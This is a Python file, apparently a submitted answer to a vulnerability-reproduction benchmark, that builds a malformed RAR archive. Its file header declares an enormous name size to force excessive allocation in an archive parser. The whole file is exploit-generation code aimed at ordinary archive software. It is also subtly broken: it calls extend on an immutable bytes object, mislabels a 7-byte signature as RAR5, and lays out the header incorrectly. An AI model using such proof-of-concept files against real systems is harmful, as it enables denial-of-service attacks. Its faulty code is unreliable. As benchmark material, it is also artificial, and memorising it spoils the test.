import struct
import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # RAR5 signature
        poc = b"Rar!\x1a\x07\x00"
        
        # File header (type 0x05)
        # We'll craft a header with an extremely large name size
        
        # First create the header content without CRC
        header_content = bytearray()
        
        # Header type = file header (0x05)
        header_content.append(0x05)
        
        # Flags - minimal flags
        header_content.extend(b"\x00\x00")
        
        # Skip extra area size (0 for no extra area)
        header_content.append(0x00)
        
        # File attributes (0)
        header_content.append(0x00)
        
        # Modification time (0)
        header_content.append(0x00)
        
        # CRC32 of file data (0)
        header_content.append(0x00)
        
        # Compressed size (0)
        header_content.append(0x00)
        
        # Uncompressed size (0)
        header_content.append(0x00)
        
        # Host OS (Windows = 0)
        header_content.append(0x00)
        
        # Name size - this is the critical part
        # We use a 64-bit variable length integer to represent a huge value
        # that will cause excessive allocation
        name_size = 0xFFFFFFFFFFFFFFFF  # Maximum 64-bit value
        
        # Encode as variable-length integer
        while True:
            byte = name_size & 0x7F
            name_size >>= 7
            if name_size == 0:
                header_content.append(byte)
                break
            header_content.append(byte | 0x80)
            # Limit to avoid infinite loop - we'll use maximum 8 bytes
            if len(header_content) - header_content.index(0x00) - 10 >= 8:
                header_content[-1] &= 0x7F  # Clear continuation bit
                break
        
        # Name (minimal, just to have something)
        header_content.extend(b"x")
        
        # Calculate CRC32 of header content
        crc = 0
        for byte in header_content:
            crc ^= byte
            for _ in range(8):
                if crc & 1:
                    crc = (crc >> 1) ^ 0xEDB88320
                else:
                    crc >>= 1
        crc ^= 0xFFFFFFFF
        
        # Build final header
        header = bytearray()
        header.extend(struct.pack("<I", crc))  # Header CRC
        header.extend(struct.pack("<H", len(header_content)))  # Header size
        header.extend(header_content)
        
        poc.extend(header)
        
        # Add end of archive header (type 0x07)
        end_header = bytearray()
        end_header.append(0x07)  # Header type = end of archive
        end_header.extend(b"\x00\x00")  # Flags
        
        # Calculate CRC for end header
        end_crc = 0
        for byte in end_header:
            end_crc ^= byte
            for _ in range(8):
                if end_crc & 1:
                    end_crc = (end_crc >> 1) ^ 0xEDB88320
                else:
                    end_crc >>= 1
        end_crc ^= 0xFFFFFFFF
        
        poc.extend(struct.pack("<I", end_crc))
        poc.extend(struct.pack("<H", len(end_header)))
        poc.extend(end_header)
        
        return bytes(poc)
